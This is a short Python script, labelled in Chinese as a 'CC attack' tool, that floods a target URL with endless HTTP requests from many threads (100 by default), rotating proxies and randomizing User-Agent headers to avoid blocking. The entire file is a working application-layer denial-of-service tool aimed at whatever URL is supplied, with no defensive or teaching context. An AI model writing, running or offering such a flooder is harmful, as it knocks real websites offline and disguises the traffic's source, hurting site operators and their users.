#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import threading
import argparse
import urllib.request
import random
from change_proxy import change_proxy
from agent import agent

agents = agent()

def cc_attack(url):
    change_proxy()
    while True:
        req = urllib.request.Request(url , headers = {'User-Agent':random.choice(agents)})
        urllib.request.urlopen(req)

if __name__ == '__main__':
    parser = argparse.ArgumentParser('CC攻击器')
    parser.add_argument('-n' , '--number' , help = '线程数' , default = 100 , type=int)
    parser.add_argument('url' , help = '要攻击的url地址')
    args = parser.parse_args()
    threads = []
    
    for number in range(args.number):
        threads.append(threading.Thread(target = cc_attack , kwargs = {'url' : args.url}))
        threads[number].setDaemon(True)
        threads[number].start()
    
    for number in range(args.number):
        threads[number].join()
